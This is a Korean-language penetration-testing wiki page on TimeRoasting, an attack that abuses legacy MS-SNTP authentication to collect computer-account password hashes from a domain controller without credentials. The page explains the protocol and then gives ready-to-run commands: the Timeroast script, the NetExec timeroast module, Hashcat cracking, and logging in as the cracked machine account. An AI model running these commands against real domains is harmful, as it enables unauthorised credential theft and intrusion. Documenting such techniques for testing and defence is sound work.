# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting은 레거시 MS-SNTP 인증을 악용합니다. 인증되지 않은 클라이언트는 선택한 컴퓨터 계정 RID가 포함된 68바이트 요청을 전송할 수 있습니다. 악용 가능한 레거시 경로에서 도메인 컨트롤러는 Netlogon을 통해 컴퓨터 계정의 NT 해시(MD4에서 파생된 비밀번호 secret)를 사용하여 응답 authenticator를 생성하므로, 공격자는 오프라인 비밀번호 추측에 적합한 challenge/MAC 쌍(Hashcat mode 31300)을 얻을 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

MS-SNTP의 3.1.5.1 및 4절에서는 요청과 응답 동작을 설명합니다:<sup>[[1]](#references)</sup>
![TimeRoasting: 자세한 내용은 공식 MS-SNTP 사양의 3.1.5.1절 "Authentication Request Behavior"와 4절 "Protocol Examples"를 참조하세요](../../images/Pasted%20image%2020250709114508.png)
`ExtendedAuthenticatorSupported`가 false인 경우, 요청은 authenticator의 Key Identifier 하위 31비트에 RID를 저장하고 상위 비트에 selector bit를 저장합니다. 서버는 68바이트 길이를 확인하고 RID를 추출한 다음, Netlogon에 candidate checksum 계산을 요청하고, 해당 상위 비트를 사용하여 하나를 선택한 후, 응답 Key Identifier를 0으로 설정하고 선택한 checksum을 반환합니다.<sup>[[1]](#references)</sup>

crypto-checksum은 MD5 기반이며(3.2.5.1.1 참조), 오프라인에서 crack할 수 있으므로 roasting attack이 가능합니다.<sup>[[1]](#references)</sup>

## 공격 방법

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort가 작성한 Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcat을 사용한 실전 공격(인증 없음)

- NetExec의 `timeroast` 모듈은 computer RID를 열거하고, 인증 없이 MS-SNTP MAC을 수집하며, 크래킹에 바로 사용할 수 있는 `$sntp-ms$` 해시를 출력할 수 있습니다:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC)을 사용해 오프라인에서 Crack:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 복구된 평문은 컴퓨터 계정 암호에 해당합니다. NTLM이 비활성화된 경우 Kerberos(-k)를 사용하여 컴퓨터 계정으로 직접 시도하세요:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### 운영 참고 사항
- Kerberos에서 복구한 자격 증명을 사용하기 전에 정확한 시간을 확인하세요. `chronyd`/`systemd-timesyncd`와 같이 유지 관리되는 NTP 클라이언트를 우선 사용하세요. 여기서는 일반적인 lab 명령으로 `ntpdate`를 유지합니다: `sudo ntpdate <dc_fqdn>`.
- 필요한 경우 AD realm에 대한 krb5.conf를 생성하세요: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 인증된 foothold를 확보한 후 LDAP/BloodHound를 통해 RID를 principal에 매핑하세요.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast` module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
